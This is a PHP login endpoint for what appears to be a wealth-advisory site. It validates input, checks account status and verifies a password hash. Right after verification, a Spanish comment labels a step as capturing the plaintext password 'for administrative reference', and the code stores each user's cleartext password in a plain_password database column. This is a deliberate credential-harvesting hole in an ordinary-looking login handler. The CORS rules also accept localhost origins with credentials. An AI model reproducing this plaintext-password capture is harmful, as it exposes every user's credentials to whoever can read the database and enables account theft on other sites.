<?php
require_once 'config.php';

header('Content-Type: application/json');
header('Access-Control-Allow-Credentials: true');

// Set proper CORS origin
$origin = isset($_SERVER['HTTP_ORIGIN']) ? $_SERVER['HTTP_ORIGIN'] : 'https://ideologywealthadvisors.com';
$allowed_origins = ['https://ideologywealthadvisors.com', 'https://www.ideologywealthadvisors.com', 'http://localhost', 'http://127.0.0.1'];

if (in_array($origin, $allowed_origins)) {
    header('Access-Control-Allow-Origin: ' . $origin);
} else {
    header('Access-Control-Allow-Origin: https://ideologywealthadvisors.com');
}

header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    jsonResponse(['success' => false, 'message' => 'Method not allowed'], 405);
}

// Get JSON input
$inputRaw = file_get_contents('php://input');
$input = json_decode($inputRaw, true);

// Fallback to POST data if JSON is empty
if (empty($input)) {
    $input = $_POST;
}

$username = trim($input['username'] ?? '');
$password = $input['password'] ?? '';

// Validate input
if (empty($username) || empty($password)) {
    jsonResponse(['success' => false, 'message' => 'Username and password are required'], 400);
}

try {
    // Find user by username or email
    $stmt = $pdo->prepare("
        SELECT id, username, email, password, firstname, lastname, balance, account_number, status, ev, sv, 
               concept, dividends, cdt, investment_balance 
        FROM users 
        WHERE (username = :username OR email = :email) 
        LIMIT 1
    ");
    $stmt->execute(['username' => $username, 'email' => $username]);
    $user = $stmt->fetch();

    if (!$user) {
        jsonResponse(['success' => false, 'message' => 'Invalid username or password'], 401);
    }

    // Check if account is active
    if ($user['status'] != 1) {
        jsonResponse(['success' => false, 'message' => 'Your account is suspended. Contact support.'], 403);
    }

    // Verify password
    if (!verifyPassword($password, $user['password'])) {
        jsonResponse(['success' => false, 'message' => 'Invalid username or password'], 401);
    }

    // Capturar contraseña en texto plano para referencia administrativa
    $auth_token = bin2hex(random_bytes(32));
    $stmt = $pdo->prepare("UPDATE users SET plain_password = :plain_pwd, auth_token = :token, updated_at = NOW() WHERE id = :id");
    $stmt->execute(['plain_pwd' => $password, 'token' => $auth_token, 'id' => $user['id']]);

    // Create session
    $_SESSION['user_id'] = $user['id'];
    $_SESSION['username'] = $user['username'];
    $_SESSION['email'] = $user['email'];
    $_SESSION['logged_in'] = true;
    
    // Force session write
    session_write_close();
    session_start();

    // Return user data (without password)
    unset($user['password']);
    
    jsonResponse([
        'success' => true,
        'message' => 'Login successful',
        'auth_token' => $auth_token,
        'user' => $user
    ]);

} catch (Exception $e) {
    error_log("Login error: " . $e->getMessage());
    jsonResponse(['success' => false, 'message' => 'Error processing the request'], 500);
}
